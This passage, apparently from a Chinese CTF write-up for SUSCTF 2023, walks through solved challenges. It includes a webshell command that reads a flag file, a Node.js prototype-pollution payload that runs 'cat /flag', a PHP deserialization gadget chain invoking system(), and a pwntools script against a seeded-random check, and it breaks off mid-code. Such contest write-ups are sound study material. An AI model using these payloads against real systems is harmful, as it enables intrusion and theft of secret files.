punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image-20231013195922046.png\" alt=\"image-20231013195922046\"></p>\n<p>利用 ls 查看当前的目录文件，可以发现，已经成功生成相关文件以及 1.php 。</p>\n<p><img data-src=\"image-20231013195744753.png\" alt=\"image-20231013195744753\"></p>\n<p>利用以下语句得到我们的文件，并查看到 flag：</p>\n<pre><code>1.php?1=system(&quot;cat f1ag_c7271.php&quot;);\n</code></pre>\n<p><img data-src=\"image-20231013195653670.png\" alt=\"image-20231013195653670\"></p>\n<p><code>susctf&#123;php is easy af0c79401aea&#125;</code></p>\n<h3 id=\"pollut-me\"><a class=\"markdownIt-Anchor\" href=\"#pollut-me\">#</a> pollut me</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNTFjdG8uY29tL2FydGljbGUvNzUxMzg4Lmh0bWw=\">node.js 污染</span></p>\n<p>将源代码下载下来进行解读，发现里面已经有了一个用户 test，用 test 进行登录，并尝试修改自己的信息，利用修改信息调用 merge 可以触发原型链污染，代码中提示我们 flag 在 /flag 中，我们可以加入 <code>__proto__</code> 属性 &quot;eval_item&quot;，其值是 cat /flag，这样就会通过 if 判断，进行执行。</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 修改信息页面</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/update-info'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">sendFile</span><span class=\"token punctuation\">(</span>__dirname <span class=\"token operator\">+</span> <span class=\"token string\">'/public/update-info.html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 处理修改信息请求</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  app<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/update-info'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">let</span> username <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">let</span> user <span class=\"token operator\">=</span> users<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">u</span> <span class=\"token operator\">=></span> u<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">message</span><span class=\"token operator\">:</span> <span class=\"token string\">'姓名更新成功'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">u</span> <span class=\"token operator\">=></span> u<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">'用户未找到。'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/eval\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span>res</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">let</span> test<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>eval_item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token comment\">//in one contains, you can do eval only once,now i tell you flag in /flag</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">&#123;</span> execSync <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">execSync</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>eval_item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"none\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"image-20231013211711836.png\" alt=\"image-20231013211711836\"></p>\n<p><code>susctf&#123;p0llut3_w3ll_78b535fd1d9b&#125;</code></p>\n<h3 id=\"why-not-play-a-game\"><a class=\"markdownIt-Anchor\" href=\"#why-not-play-a-game\">#</a> why not play a game</h3>\n<p>本题直接打开源代码就可以发现 flag</p>\n<p><img data-src=\"image-20231014144424179.png\" alt=\"image-20231014144424179\"></p>\n<p><code>susctf&#123;welcome_to_susctf_2023_ctf_is_so_fun&#125;</code></p>\n<h3 id=\"转瞬即逝\"><a class=\"markdownIt-Anchor\" href=\"#转瞬即逝\">#</a> 转瞬即逝</h3>\n<p>提示如下：</p>\n<p>即时间和密码的差值小于 5 时才可以通过验证</p>\n<pre><code> &lt;!-- maybe... int(time.time()) - int(password) &lt; 5 --&gt;\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWF0b29scy5jb20vdGltZXN0YW1w\">在线获取时间戳</span>，并根据手速进行略微修正自己的密码，登陆后页面转瞬即逝，所以采用抓包进行查看，得到如下内容：</p>\n<p><img data-src=\"image-20231014200809419.png\" alt=\"image-20231014200809419\"></p>\n<p>显然是一个加密，直接丢入 cyberchef 进行 magic 即可</p>\n<pre><code>eyJhbGciOiJIUzI1NiJ9.eyJnaWZ0Ijoic3VzY3Rme1lvdXJfR2kxVF9PZl9NT01FbnRfNmY4ZTFiMTk0YjE2fSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.OA-iCBGh33axSvXRCc0YBlQjxse_JIAENxn-qropZOM\n</code></pre>\n<p><img data-src=\"image-20231014200934693.png\" alt=\"image-20231014200934693\"></p>\n<p><code>susctf&#123;Your_Gi1T_Of_MOMEnt_6f8e1b194b16&#125;</code></p>\n<h3 id=\"sleep-away\"><a class=\"markdownIt-Anchor\" href=\"#sleep-away\">#</a> sleep away</h3>\n<p>第一步 md5 绕过，只要是科学计数法即可：</p>\n<pre><code>http://game.ctf.seusus.com:40044/?step1=0e215962017\n</code></pre>\n<p>第二步构造反序列化 1.php：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">safeeval</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$evalstr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$args_down</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls la /\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$evalstr</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">evalstr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$evalstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">helper</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$youneed</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$truearg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$thinkit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$you</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$think</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">thinkit</span><span class=\"token operator\">=</span><span class=\"token variable\">$think</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">youneed</span><span class=\"token operator\">=</span><span class=\"token variable\">$you</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">truearg</span><span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"wakeup\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">youneed</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">turearg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">safeeval</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>运行：</p>\n<pre><code>php -f 1.php   # ---&gt; O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;s:7:&quot;ls la /&quot;;&#125;\n</code></pre>\n<pre><code>http://game.ctf.seusus.com:24076/?step1=0e215962017&amp;backdoor=O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;s:7:&quot;ls la /&quot;;&#125;\n</code></pre>\n<p>直接注入的话 args_down 会被 wake_up 函数直接置为空：</p>\n<p><img data-src=\"image-20231015104120912.png\" alt=\"image-20231015104120912\"></p>\n<p>如果更改 safeeval 元素超过 2 个的话则会没有任何反应。</p>\n<p><img data-src=\"image-20231015103956847.png\" alt=\"image-20231015103956847\"></p>\n<p>利用 class helper，进行构建，将 youneed 和 args_down 进行内存地址链接。使得 wake_up 时先执行 safeeval 的 wake_up，将 arg 置为空后，再执行 helper 的 wake_up，对 youneed 进行赋值，args_down 的值也会随之改变。</p>\n<p>代码和结果如下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">safeeval</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$evalstr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$args_down</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls la /\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$evalstr</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">evalstr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$evalstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">helper</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$youneed</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$turearg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$thinkit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"wakeup\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">youneed</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">turearg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">safeeval</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$he</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">helper</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$he</span><span class=\"token operator\">-></span><span class=\"token property\">youneed</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$test</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$he</span><span class=\"token operator\">-></span><span class=\"token property\">thinkit</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$he</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><pre><code>O:6:&quot;helper&quot;:3:&#123;s:7:&quot;youneed&quot;;s:7:&quot;ls la /&quot;;s:7:&quot;turearg&quot;;s:2:&quot;ls&quot;;s:7:&quot;thinkit&quot;;O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;R:2;&#125;&#125;\n</code></pre>\n<pre><code>http://game.ctf.seusus.com:24076/?step1=0e215962017&amp;backdoor=O:6:&quot;helper&quot;:3:&#123;s:7:&quot;youneed&quot;;s:7:&quot;ls la /&quot;;s:7:&quot;turearg&quot;;s:2:&quot;ls&quot;;s:7:&quot;thinkit&quot;;O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;R:2;&#125;&#125;\n</code></pre>\n<p>得到如下内容：</p>\n<p><img data-src=\"image-20231015113032096.png\" alt=\"image-20231015113032096\"></p>\n<p><img data-src=\"image-20231015113133080.png\" alt=\"image-20231015113133080\"></p>\n<p>修改为 cat /f1agggg：</p>\n<pre><code>O:6:&quot;helper&quot;:3:&#123;s:7:&quot;youneed&quot;;s:7:&quot;ls la /&quot;;s:7:&quot;turearg&quot;;s:12:&quot;cat /f1agggg&quot;;s:7:&quot;thinkit&quot;;O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;R:2;&#125;&#125;\n</code></pre>\n<p><img data-src=\"image-20231015113217333.png\" alt=\"image-20231015113217333\"></p>\n<p>拿到 flag： <code>susctf&#123;R_1s_g00d_e1a2b8682df9&#125;</code></p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h2>\n<h3 id=\"random\"><a class=\"markdownIt-Anchor\" href=\"#random\">#</a> random</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lfcGVhay9hcnRpY2xlL2RldGFpbHMvMTEzODQ0NTA5\">参考学习</span></p>\n<p>异或操作一个数，再异或该数就可以得到它本身。</p>\n<p><img data-src=\"image-20231014202334171.png\" alt=\"image-20231014202334171\"></p>\n<p><img data-src=\"image-20231014205053925.png\" alt=\"image-20231014205053925\"></p>\n<p>代码如下所示，先在本地得到一个随机数，将其与 -889275714 进行异或操作就可以得到 key 的值，随后利用该 key 链接远程环境进行攻击。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dll <span class=\"token operator\">=</span> CDLL<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># sh = process('/mnt/e/ramDownload/random')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"game.ctf.seusus.com\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">36349</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dll<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dll<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> <span class=\"token number\">1804289383</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>v <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">889275714</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>key <span class=\"token operator\">=</span> r <span class=\"token operator\">^</span> v</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(key) #-1586102311</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'mind?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1586102311</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在远程环境下运行，得到 flag：</p>\n<p><img data-src=\"image-20231014204746771.png\" alt=\"image-20231014204746771\"></p>\n<p><code>susctf&#123;ju57_p5euD0-raNDoM_8441355483d1&#125;</code></p>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h2>\n<h3 id=\"signin\"><a class=\"markdownIt-Anchor\" href=\"#signin\">#</a> signin</h3>\n<p>掏出 DIE：</p>\n<p><img data-src=\"image-20231014205220789.png\" alt=\"image-20231014205220789\"></p>\n<p>好了，可以丢进 IDA 了：</p>\n<p><img data-src=\"image-20231014210556913.png\" alt=\"image-20231014210556913\"></p>\n<p>读进去的数进行一系列操作后和 unk_41F000 进行比较，我们只需要将这个一系列过程反过来进行执行，通过 unk_41F000 得到我们需要输入的数：</p>\n<p><img data-src=\"image-20231014210541108.png\" alt=\"image-20231014210541108\"></p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption 